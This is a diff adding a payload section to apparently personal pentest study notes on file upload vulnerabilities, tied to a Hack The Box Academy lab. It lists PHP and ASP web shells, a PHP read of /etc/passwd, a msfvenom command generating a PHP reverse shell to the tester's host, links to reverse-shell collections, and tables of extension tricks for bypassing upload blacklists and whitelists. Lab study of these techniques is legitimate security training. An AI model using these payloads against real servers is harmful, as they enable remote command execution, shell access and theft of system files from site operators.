@@ -1,5 +1,32 @@
 # FILE UPLOAD
 
+## Payloads
+- Web-Extensions: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
+- Basic PHP File Read: `<?php file_get_contents('/etc/passwd'); ?>	`
+- Basic PHP Command Execution: `<?php system('hostname'); ?>`
+- Basic PHP Web Shell: `<?php system($_REQUEST['cmd']); ?>`
+- Basic ASP Web Shell: `<% eval request('cmd') %>`
+- Generate PHP reverse shell: `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`
+- Phpbash-Interactive web shell: https://github.com/Arrexel/phpbash
+- Php reverse Shell: https://github.com/pentestmonkey/php-reverse-shell
+- All web and Reverse Shell: https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
+  ### Blacklist Bypass
+
+  | File Extension	| Purpose |
+  | ---------- | ----------- |
+  | shell.pHp	| Case Manipulation |
+  | [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)	| List of PHP Extensions |
+  | [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)	| List of ASP Extensions |
+  | [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)	| List of Web Extensions |
+
+  ### Whitelist Bypass
+  
+  | File Extension	| Purpose |
+  | ---------- | ----------- |
+  | shell.jpg.php	| Double Extension |
+  | shell.php.jpg	| Reverse Double Extension |
+  | %20, %0a, %00, %0d0a, /, .\, ., … |	Character Injection - Before/After Extension |
+
 ## Arbitary file uploads
 https://enterprise.hackthebox.com/academy-lab/30000/2125/modules/136/1291
 
